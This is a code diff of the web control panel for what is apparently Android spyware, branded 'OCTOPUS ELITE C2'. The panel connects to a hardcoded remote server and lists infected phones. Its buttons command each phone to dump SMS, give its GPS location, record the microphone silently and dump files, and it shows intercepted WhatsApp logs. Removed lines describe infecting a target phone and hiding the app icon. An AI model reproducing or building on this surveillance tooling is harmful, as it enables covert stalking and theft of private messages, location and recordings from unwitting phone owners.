@@ -3,16 +3,17 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>OCTOPUS CORE | V4.0.1_BETA</title>
+    <title>OCTOPUS ELITE | V5.0_STABLE</title>
     <script src="https://cdn.socket.io/4.6.1/socket.io.min.js"></script>
     <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@300;500;700&display=swap" rel="stylesheet">
     <style>
         :root {
             --neon-red: #ff003c;
-            --dark-bg: #050505;
+            --dark-bg: #030303;
             --terminal-green: #00ff41;
             --toxic-yellow: #f1c40f;
-            --glass: rgba(255, 255, 255, 0.03);
+            --wa-cyan: #00f2ff;
+            --glass: rgba(255, 255, 255, 0.05);
         }
 
         * { margin: 0; padding: 0; box-sizing: border-box; cursor: crosshair; }
@@ -20,90 +21,115 @@
         body {
             background-color: var(--dark-bg);
             background-image: radial-gradient(circle, #111 1px, transparent 1px);
-            background-size: 30px 30px;
+            background-size: 25px 25px;
             color: #eee;
             font-family: 'Fira Code', monospace;
-            overflow-x: hidden;
-        }
-
-        /* --- GLITCH ANIMATION --- */
-        .glitch {
-            font-size: 2rem;
-            font-weight: bold;
-            text-transform: uppercase;
-            position: relative;
-            text-shadow: 0.05em 0 0 #00fffc, -0.03em -0.04em 0 #fc00ff, 0.025em 0.04em 0 #fffc00;
-            animation: glitch 725ms infinite;
-        }
-
-        @keyframes glitch {
-            0% { text-shadow: 0.05em 0 0 #00fffc, -0.03em -0.04em 0 #fc00ff, 0.025em 0.04em 0 #fffc00; }
-            15% { text-shadow: 0.05em 0 0 #00fffc, -0.03em -0.04em 0 #fc00ff, 0.025em 0.04em 0 #fffc00; }
-            16% { text-shadow: -0.05em -0.025em 0 #00fffc, 0.025em 0.035em 0 #fc00ff, -0.05em -0.05em 0 #fffc00; }
-            100% { text-shadow: -0.025em 0 0 #00fffc, -0.025em -0.025em 0 #fc00ff, -0.025em -0.05em 0 #fffc00; }
-        }
-
-        header {
-            padding: 40px;
-            border-bottom: 1px solid #222;
+            height: 100vh;
             display: flex;
-            justify-content: space-between;
-            align-items: center;
-            background: linear-gradient(to bottom, #000, transparent);
-        }
-
-        .container { display: grid; grid-template-columns: 1fr 350px; gap: 20px; padding: 20px; }
-
-        /* --- TARGET CARDS --- */
-        #target-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(300px, 1fr)); gap: 15px; }
-        
-        .card {
-            background: var(--glass);
-            border: 1px solid #1a1a1a;
-            padding: 20px;
-            border-radius: 4px;
-            transition: 0.3s;
-            position: relative;
+            flex-direction: column;
             overflow: hidden;
         }
 
-        .card:hover { border-color: var(--neon-red); box-shadow: 0 0 15px rgba(255, 0, 60, 0.2); }
-
-        .card::before {
-            content: 'ONLINE';
-            position: absolute;
-            top: 5px; right: 5px;
-            font-size: 8px; color: var(--terminal-green);
+        /* --- TOP BAR --- */
+        header {
+            padding: 20px 40px;
+            border-bottom: 2px solid #1a1a1a;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            background: #000;
         }
 
-        .btn-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-top: 15px; }
+        .glitch {
+            font-size: 1.5rem;
+            font-weight: bold;
+            color: #fff;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+        }
+
+        #auth-status { font-size: 10px; color: var(--terminal-green); letter-spacing: 1px; }
+
+        /* --- MAIN LAYOUT --- */
+        .wrapper {
+            display: grid;
+            grid-template-columns: 1fr 400px;
+            flex-grow: 1;
+            overflow: hidden;
+        }
+
+        /* --- TARGET GRID --- */
+        main { padding: 25px; overflow-y: auto; background: rgba(0,0,0,0.5); }
+        
+        #target-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(320px, 1fr));
+            gap: 20px;
+        }
+
+        .card {
+            background: #0a0a0a;
+            border: 1px solid #222;
+            padding: 20px;
+            position: relative;
+            transition: 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+        }
+
+        .card:hover { border-color: var(--neon-red); transform: translateY(-5px); box-shadow: 0 10px 30px rgba(255, 0, 60, 0.1); }
+
+        .card h4 { color: var(--neon-red); margin-bottom: 5px; font-size: 14px; }
+        .card small { color: #555; display: block; margin-bottom: 15px; font-size: 10px; }
+
+        .btn-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 8px; }
 
         button {
-            background: transparent;
+            background: #111;
             border: 1px solid #333;
-            color: #fff;
-            padding: 10px;
+            color: #ccc;
+            padding: 8px;
             font-family: inherit;
-            font-size: 11px;
-            transition: 0.2s;
+            font-size: 10px;
             text-transform: uppercase;
+            transition: 0.2s;
         }
 
-        button:hover { background: var(--neon-red); border-color: var(--neon-red); color: #000; font-weight: bold; }
+        button:hover { background: var(--neon-red); color: #000; border-color: var(--neon-red); font-weight: bold; }
+        
+        .btn-danger { color: #ff4d4d; border-color: #441111; margin-top: 10px; width: 100%; }
+        .btn-danger:hover { background: #ff4d4d; color: #000; }
 
-        /* --- SIDEBAR LOGS --- */
-        .sidebar { background: #000; border: 1px solid #222; padding: 20px; height: 85vh; overflow-y: auto; }
-        #terminal { font-size: 12px; color: var(--terminal-green); line-height: 1.5; }
+        /* --- TERMINAL SIDEBAR --- */
+        .sidebar {
+            background: #000;
+            border-left: 1px solid #222;
+            display: flex;
+            flex-direction: column;
+        }
 
-        /* --- INFO SECTIONS --- */
-        .section { margin-top: 40px; padding: 20px; border-top: 1px solid #222; }
-        .toxic-profile { color: #888; border-left: 2px solid var(--neon-red); padding-left: 15px; }
-        .help-guide { color: var(--toxic-yellow); font-size: 13px; }
+        .sidebar-header { padding: 15px; background: #080808; border-bottom: 1px solid #222; font-size: 12px; color: #888; }
 
-        /* Responsive */
-        @media (max-width: 900px) {
-            .container { grid-template-columns: 1fr; }
-            .sidebar { height: 400px; }
+        #terminal {
+            padding: 15px;
+            font-size: 11px;
+            color: var(--terminal-green);
+            overflow-y: auto;
+            flex-grow: 1;
+            line-height: 1.6;
+            word-break: break-all;
+        }
+
+        #terminal p { margin-bottom: 8px; border-bottom: 1px solid #111; padding-bottom: 4px; }
+
+        /* --- SCROLLBAR --- */
+        ::-webkit-scrollbar { width: 5px; }
+        ::-webkit-scrollbar-track { background: #000; }
+        ::-webkit-scrollbar-thumb { background: #222; }
+        ::-webkit-scrollbar-thumb:hover { background: var(--neon-red); }
+
+        /* --- MOBILE ADAPT --- */
+        @media (max-width: 1000px) {
+            .wrapper { grid-template-columns: 1fr; }
+            .sidebar { height: 350px; }
         }
     </style>
 </head>
@@ -111,100 +137,120 @@
 
 <header>
     <div>
-        <h1 class="glitch">OCTOPUS_SYSTEM_C2</h1>
-        <p style="font-size: 10px; color: #555;">STATUS: UNTRACEABLE | NODE: 51.68.234.157</p>
+        <h1 class="glitch">OCTOPUS_ELITE_C2</h1>
+        <div id="auth-status">INITIALIZING_SECURE_LINK...</div>
     </div>
-    <div id="connection-dot" style="width: 15px; height: 15px; background: red; border-radius: 50%; box-shadow: 0 0 10px red;"></div>
+    <div style="text-align: right">
+        <p id="op-id" style="color: var(--toxic-yellow); font-size: 12px;"></p>
+        <p style="font-size: 8px; color: #444;">ENCRYPTION: AES-256-RSA</p>
+    </div>
 </header>
 
-<div class="container">
+<div class="wrapper">
     <main>
         <div id="target-grid">
             </div>
-
-        <div class="section help-guide">
-            <h3>[ HELP_MANUAL.md ]</h3>
-            <p>> 1. COMPILATION: Build APK via PowerShell using gradlew.</p>
-            <p>> 2. INFECTION: Deploy to target. MUST enable Accessibility Service manually.</p>
-            <p>> 3. INTERCEPTION: WhatsApp logs stream automatically once chat is opened.</p>
-            <p>> 4. COMMANDS: Click action buttons to dump SMS (50 count) or pull GPS coords.</p>
-            <p>> 5. SILENCE: App icon hides automatically upon service start.</p>
-        </div>
-
-        <div class="section toxic-profile">
-            <h3>[ ABOUT_DEVELOPER.log ]</h3>
-            <p><strong>NAME:</strong> SAMEER (19-Year-Old Illegal Architect)</p>
-            <p><strong>STATUS:</strong> Mentally Redlining / Depressed / Toxic High-Performance</p>
-            <p><strong>BIO:</strong> Operating in the shadows of the web. I don't build apps; I build nightmares. Zero social life, max code. My code is clean, but my history is blacklisted. I code to forget I'm human.</p>
-            <p><strong>SPECIALTY:</strong> Breaking things that are supposed to be "secure".</p>
-        </div>
     </main>
 
     <aside class="sidebar">
-        <h4 style="margin-bottom: 10px; border-bottom: 1px solid #333;">RAW_DATA_STREAM</h4>
+        <div class="sidebar-header">LIVE_DATA_INTERCEPTOR</div>
         <div id="terminal">
-            <p>> Initializing Socket connection...</p>
-            <p>> Waiting for target heartbeat...</p>
+            <p>> Waiting for Mastermind Authentication...</p>
         </div>
     </aside>
 </div>
 
 <script>
+    // --- AUTHENTICATION LAYER ---
+    const operator = prompt("OPERATOR_ID:");
+    const accessKey = prompt("ACCESS_KEY:");
+
     const socket = io("http://51.68.234.157:20211", { 
-        query: { type: 'mastermind', key: 'octopus_xx1' } 
+        query: { 
+            type: 'mastermind', 
+            user: operator, 
+            key: accessKey 
+        } 
     });
 
     const term = document.getElementById('terminal');
-    const dot = document.getElementById('connection-dot');
+    const authStatus = document.getElementById('auth-status');
+    const opIdDisplay = document.getElementById('op-id');
 
     socket.on('connect', () => {
-        dot.style.background = 'var(--terminal-green)';
-        dot.style.boxShadow = '0 0 15px var(--terminal-green)';
-        term.innerHTML += `<p style="color:white;">[SYSTEM] Handshake Verified. Mastermind Online.</p>`;
+        term.innerHTML += `<p style="color:white;">[LINK] Socket established. Verifying credentials...</p>`;
     });
 
+    socket.on('auth_success', (data) => {
+        authStatus.innerText = "LINK_STABLE // ACCESS_GRANTED";
+        authStatus.style.color = "var(--terminal-green)";
+        opIdDisplay.innerText = "OP_ACTIVE: " + data.user.toUpperCase();
+        term.innerHTML += `<p style="color:var(--terminal-green)">[SYSTEM] Welcome, Operator ${data.user}. Secure session started.</p>`;
+    });
+
+    socket.on('auth_failed', () => {
+        alert("CRITICAL_ERROR: INVALID_CREDENTIALS. DISCONNECTING.");
+        window.location.reload();
+    });
+
+    // --- TARGET HANDLERS ---
     socket.on('load_targets', (targets) => {
-        Object.keys(targets).forEach(id => addCard(id, targets[id]));
+        Object.keys(targets).forEach(id => addTargetCard(id, targets[id]));
     });
 
     socket.on('update_dashboard', (res) => {
-        addCard(res.id, res.data);
+        addTargetCard(res.id, res.data);
     });
 
+    socket.on('target_offline', (id) => {
+        const card = document.getElementById(id);
+        if(card) card.style.opacity = "0.3";
+        term.innerHTML += `<p style="color:red;">[LOST] Target ${id} went offline.</p>`;
+    });
+
+    // --- DATA STREAMING ---
     socket.on('display_extra', (res) => {
         const time = new Date().toLocaleTimeString();
         let color = "var(--terminal-green)";
-        if(res.payload.type === 'wa_log') color = "cyan";
-        if(res.payload.type === 'sms_log') color = "magenta";
+        let tag = res.payload.type.toUpperCase();
 
-        term.innerHTML += `<p style="color:${color}">[${time}] ${res.payload.type.toUpperCase()}: ${JSON.stringify(res.payload.data)}</p>`;
-        term.scrollTop = term.scrollHeight;
+        if(tag === 'WA_LOG') color = "var(--wa-cyan)";
+        if(tag === 'SMS_LOG') color = "magenta";
+        if(tag === 'ERROR') color = "red";
+
+        const logEntry = `
+            <p style="color:${color}">
+                [${time}] [${tag}] TargetID: ${res.id.substring(0,6)}...<br>
+                DATA: ${JSON.stringify(res.payload.data)}
+            </p>
+        `;
+        term.insertAdjacentHTML('afterbegin', logEntry);
     });
 
-    function addCard(id, data) {
+    function addTargetCard(id, data) {
         if(document.getElementById(id)) return;
-        const div = document.createElement('div');
-        div.id = id;
-        div.className = 'card';
-        div.innerHTML = `
-            <h4 style="color:var(--neon-red)">DEVICE: ${data.model}</h4>
-            <small style="color:#555">ID: ${id}</small>
+        
+        const grid = document.getElementById('target-grid');
+        const card = document.createElement('div');
+        card.id = id;
+        card.className = 'card';
+        card.innerHTML = `
+            <h4>NODE: ${data.model}</h4>
+            <small>UID: ${id}</small>
             <div class="btn-grid">
-                <button onclick="act('${id}','sms')">DUMP SMS</button>
-                <button onclick="act('${id}','gps')">GPS LOC</button>
-                <button onclick="act('mic')">SILENT REC</button>
-                <button onclick="act('gallery')">FILE DUMP</button>
-                <button onclick="act('cam')">CAM_SNAP</button>
-                <button onclick="act('screen')">SCREEN_CAP</button>
+                <button onclick="sendCmd('${id}','sms')">Fetch SMS</button>
+                <button onclick="sendCmd('${id}','gps')">Locate GPS</button>
+                <button onclick="sendCmd('${id}','mic')">Silent Rec</button>
+                <button onclick="sendCmd('${id}','gallery')">Dump Files</button>
             </div>
-            <button onclick="act('${id}','off')" style="width:100%; margin-top:10px; color:red; border-color:red;">TERMINATE_LINK</button>
+            <button class="btn-danger" onclick="sendCmd('${id}','off')">KILL_PROCESS</button>
         `;
-        document.getElementById('target-grid').appendChild(div);
+        grid.appendChild(card);
     }
 
-    function act(id, a) {
-        term.innerHTML += `<p style="color:var(--toxic-yellow)">> Executing ${a} on target ${id}...</p>`;
-        socket.emit('run_action', { targetId: id, action: a });
+    function sendCmd(targetId, action) {
+        term.innerHTML = `<p style="color:var(--toxic-yellow)">[CMD] Requesting ${action} on ${targetId}...</p>` + term.innerHTML;
+        socket.emit('run_action', { targetId: targetId, action: action });
     }
 </script>
 
